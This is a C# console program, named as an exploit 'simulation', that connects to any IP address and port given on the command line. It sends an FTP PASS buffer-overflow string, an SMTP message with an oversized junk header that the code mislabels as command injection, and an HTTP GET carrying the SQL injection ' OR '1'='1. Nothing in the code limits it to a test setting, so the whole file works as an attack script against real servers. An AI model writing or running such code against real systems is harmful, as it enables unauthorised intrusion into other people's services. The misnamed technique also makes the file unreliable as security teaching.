using System;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Net;

namespace AdvancedExploitSimulation
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("Advanced Exploit Simulation started...");

            if (args.Length < 3)
            {
                Console.WriteLine("Usage: AdvancedExploitSimulation.exe <ftp/smtp/http> <ipAddress> <port>");
                return;
            }

            string protocol = args[0].ToLower();
            string ipAddress = args[1];
            int port = int.Parse(args[2]);

            switch (protocol)
            {
                case "ftp":
                    await FtpExploitAsync(ipAddress, port);
                    break;
                case "smtp":
                    await SmtpExploitAsync(ipAddress, port);
                    break;
                case "http":
                    await HttpExploitAsync(ipAddress, port);
                    break;
                default:
                    Console.WriteLine("Invalid protocol specified. Use ftp, smtp, or http.");
                    break;
            }

            Console.WriteLine("Simulation completed.");
        }

        static async Task FtpExploitAsync(string ipAddress, int port)
        {
            using (var client = new TcpClient())
            {
                await client.ConnectAsync(ipAddress, port);
                using (var stream = client.GetStream())
                {
                    string userCmd = "USER anonymous\r\n";
                    string passCmd = "PASS hacker@example.com\r\n";
                    await SendAndReceiveAsync(stream, userCmd);
                    await SendAndReceiveAsync(stream, passCmd);

                    // Buffer overflow exploit with a long PASS command
                    string exploitCmd = "PASS " + new string('A', 3000) + "\r\n";
                    await SendAndReceiveAsync(stream, exploitCmd);
                }
            }
        }

        static async Task SmtpExploitAsync(string ipAddress, int port)
        {
            using (var client = new TcpClient())
            {
                await client.ConnectAsync(ipAddress, port);
                using (var stream = client.GetStream())
                {
                    await SendAndReceiveAsync(stream, "HELO hacker\r\n");
                    await SendAndReceiveAsync(stream, "MAIL FROM:<exploit@example.com>\r\n");
                    await SendAndReceiveAsync(stream, "RCPT TO:<victim@example.com>\r\n");
                    await SendAndReceiveAsync(stream, "DATA\r\n");

                    // Command injection in SMTP DATA
                    string dataPayload = "From: hacker@example.com\r\n";
                    dataPayload += "To: victim@example.com\r\n";
                    dataPayload += "Subject: Injected mail\r\n";
                    dataPayload += "X-Inject: " + new string('}', 1000) + "\r\n\r\n";
                    dataPayload += "This is an injected email content.\r\n.\r\n";
                    await SendAndReceiveAsync(stream, dataPayload);
                }
            }
        }

        static async Task HttpExploitAsync(string ipAddress, int port)
        {
            using (var client = new TcpClient())
            {
                await client.ConnectAsync(ipAddress, port);
                using (var stream = client.GetStream())
                {
                    // SQL Injection via HTTP GET request
                    string targetResource = "/search?query=" + Uri.EscapeDataString("' OR '1'='1");
                    string httpRequest = $"GET {targetResource} HTTP/1.1\r\nHost: {ipAddress}\r\nConnection: close\r\n\r\n";
                    await SendAndReceiveAsync(stream, httpRequest);
                }
            }
        }

        static async Task SendAndReceiveAsync(NetworkStream stream, string message)
        {
            byte[] buffer = Encoding.ASCII.GetBytes(message);
            await stream.WriteAsync(buffer, 0, buffer.Length);
            Console.WriteLine("Sent: " + message);
            buffer = new byte[4096];

            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
            string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            Console.WriteLine("Received: " + response);
        }
    }
}
